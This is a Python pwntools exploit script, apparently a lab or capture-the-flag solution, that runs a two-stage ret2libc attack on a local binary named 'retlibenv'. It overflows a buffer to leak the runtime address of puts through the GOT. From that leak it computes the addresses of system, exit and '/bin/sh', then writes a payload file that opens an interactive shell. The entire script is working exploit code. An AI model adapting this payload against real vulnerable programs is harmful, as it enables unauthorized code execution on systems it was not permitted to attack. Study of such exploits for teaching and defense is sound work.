from pwn import *
#context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','sh','-c']

elf = ELF('./retlibenv')
libc = ELF('./libc.so')

offset = 0x14+4

# Step1: lead libc_base address
start_addr = elf.symbols['_start']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
puts_libc = libc.symbols['puts']

payload = 'a'*offset + p32(puts_plt) + p32(start_addr) + p32(puts_got)

with open('badfile','w') as f:
	f.write(payload)

io = process('./retlibenv')
io.sendline('')
puts_real_addr = u32(io.recvline()[:4])
print hex(puts_real_addr)

# Step2: get shell
libc_base = puts_real_addr-puts_libc
system_addr = libc_base + libc.symbols['system']
exit_addr = libc_base + libc.symbols['exit']
binsh_addr = libc_base + next(libc.search('/bin/sh'))
print "[*] system_addr = {}".format(hex(system_addr))
print "[*] exit_addr = {}".format(hex(exit_addr))

payload = 'a'*offset + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)
print payload
with open('badfile','w') as f:
	f.write(payload)
print "[*] write !"
io.sendline('')
io.interactive()
